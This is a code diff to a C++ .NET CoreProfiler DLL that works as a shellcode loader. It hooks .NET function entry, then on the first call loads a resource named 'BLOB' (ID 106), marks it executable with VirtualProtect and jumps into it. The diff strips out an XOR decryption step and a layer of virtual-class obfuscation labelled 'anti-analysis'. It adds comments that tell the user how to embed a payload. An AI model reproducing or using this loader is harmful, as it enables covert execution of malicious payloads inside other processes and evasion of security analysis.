@@ -25,6 +25,8 @@
 #endif
 #include "OS.h"
 
+bool executed = FALSE;
+
 HRESULT __stdcall CoreProfiler::QueryInterface(REFIID riid, void** ppvObject) {
 	if (ppvObject == nullptr)
 		return E_POINTER;
@@ -63,97 +65,7 @@ extern "C" __declspec(dllexport) int __stdcall PleaseFindMe(long bar) {
 	return 3494;
 }
 
-void xor_crypt(const char* key, int key_len, char* data, int data_len)
-{
-	for (int i = 0; i < data_len; i++)
-		data[i] ^= key[i % key_len];
-}
 
-// VTABLE HELL FOR ANTIANALYSIS
-
-class A
-{
-public:
-	virtual BOOL  getHandle(HMODULE *hm);						// A
-	virtual void* getProfile(HMODULE *hm, DWORD *size);			// B
-	virtual BOOL  getChangeable(void* exec, DWORD *profileSize);	// C
-	virtual void  change(void* exec, DWORD *profileSize);		// D
-	virtual BOOL  getChanged(void* exec, DWORD *profileSize);	// E
-};
-
-BOOL A::getHandle(HMODULE *hm) {
-	return GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
-		(LPCSTR)&PleaseFindMe, hm);
-}
-
-void* A::getProfile(HMODULE *hm, DWORD *profileSize) {
-	return NULL;
-
-}
-
-BOOL A::getChangeable(void* exec, DWORD *profileSize) {
-	return true;
-}
-
-void A::change(void* exec, DWORD *profileSize) {
-	return;
-}
-
-BOOL A::getChanged(void* exec, DWORD *profileSize) {
-	return TRUE;
-}
-
-class B : public A
-{
-public:
-	void* getProfile(HMODULE *hm, DWORD *size) override;
-};
-
-void* B::getProfile(HMODULE *hm, DWORD *size) {
-	HRSRC profileResource;
-	HGLOBAL profileResouceData;
-	void* exec;
-	profileResource = FindResourceW(*hm, MAKEINTRESOURCE(106), L"BLOB");
-	*size = SizeofResource(*hm, profileResource);
-	profileResouceData = LoadResource(*hm, profileResource);
-	exec = LockResource(profileResouceData);
-	return exec;
-
-}
-
-class C : public A
-{
-public:
-	BOOL getChangeable(void* exec, DWORD *profileSize) override;
-};
-
-BOOL C::getChangeable(void* exec, DWORD *profileSize) {
-	DWORD _tmp;
-	return VirtualProtect(exec, *profileSize, PAGE_READWRITE, &_tmp);
-}
-
-class D : public A
-{
-public:
-	void  change(void* exec, DWORD *profileSize) override;
-};
-
-void D::change(void* exec, DWORD *profileSize) {
-	xor_crypt("profiler", 8, (char*)exec, *profileSize);
-}
-
-class E : public A
-{
-public:
-	BOOL  getChanged(void* exec, DWORD *profileSize) override;
-};
-
-BOOL E::getChanged(void* exec, DWORD *profileSize) {
-	DWORD _tmp;
-	return VirtualProtect(exec, *profileSize, PAGE_EXECUTE_READ, &_tmp);
-}
-
-// END VTABLE HELL
 
 
 
@@ -168,27 +80,24 @@ void popProfiler() {
 	DWORD _tmp;
 	void* exec;
 
-	//UNLEASH VTABLE HELL
-	A* a = new A();
-	A* b = new B();
-	A* c = new C();
-	A* d = new D();
-	A* e = new E();
+	// set flag so further .NET functions are not hooked
+	executed = true;
 
-	/*GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
-		(LPCSTR)&PleaseFindMe, &hm);*/
-	a->getHandle(&hm);
-	/*profileResource = FindResourceW(hm, MAKEINTRESOURCE(106), L"BLOB");
+	// Use the exported function "PleaseFindMe" to get a handle to this DLL
+	GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+		(LPCSTR)&PleaseFindMe, &hm);
+	
+	// Find the payload resource - make sure the int lines up with what you resource's ID is in the "resource symbols" table of the project
+	profileResource = FindResourceW(hm, MAKEINTRESOURCE(106), L"BLOB");
+
+	// Load the resource into a buffer
 	profileSize = SizeofResource(hm, profileResource);
 	profileResouceData = LoadResource(hm, profileResource);
-	exec = LockResource(profileResouceData);*/
-	exec = b->getProfile(&hm, &profileSize);
-	/*VirtualProtect(exec, profileSize, PAGE_READWRITE, &_tmp);*/
-	c->getChangeable(exec, &profileSize);
-	/*xor_crypt("profiler", 8, (char*)exec, profileSize);*/
-	d->change(exec, &profileSize);
-	/*VirtualProtect(exec, profileSize, PAGE_EXECUTE_READ, &_tmp);*/
-	e->getChanged(exec, &profileSize);
+	exec = LockResource(profileResouceData);
+
+	// Execute the buffer
+	VirtualProtect(exec, profileSize, PAGE_EXECUTE_READ, &_tmp);
+	
 	((void(*)())exec)();
 	
 #endif // _WINDOWS
@@ -196,7 +105,9 @@ void popProfiler() {
 }
 
 void NakedEnter(FunctionID /*funcID*/) {
-	popProfiler();
+	if (!executed) {
+		popProfiler();
+	}
 	return;
 }
 
@@ -210,6 +121,8 @@ void NakedTailcall(FunctionID /*funcID*/) {
 
 
 HRESULT CoreProfiler::Initialize(IUnknown* pICorProfilerInfoUnk) {
+	
+	
 	Logger::Debug(__FUNCTION__);
 
 	pICorProfilerInfoUnk->QueryInterface(&_info);
@@ -224,7 +137,6 @@ HRESULT CoreProfiler::Initialize(IUnknown* pICorProfilerInfoUnk) {
 		COR_PRF_MONITOR_EXCEPTIONS |
 		COR_PRF_MONITOR_JIT_COMPILATION |
 		COR_PRF_MONITOR_ENTERLEAVE);
-	//|	COR_PRF_MONITOR_OBJECT_ALLOCATED | COR_PRF_ENABLE_OBJECT_ALLOCATED);
 
 	HRESULT hr = _info->SetEnterLeaveFunctionHooks2
 	((FunctionEnter2*)&NakedEnter,
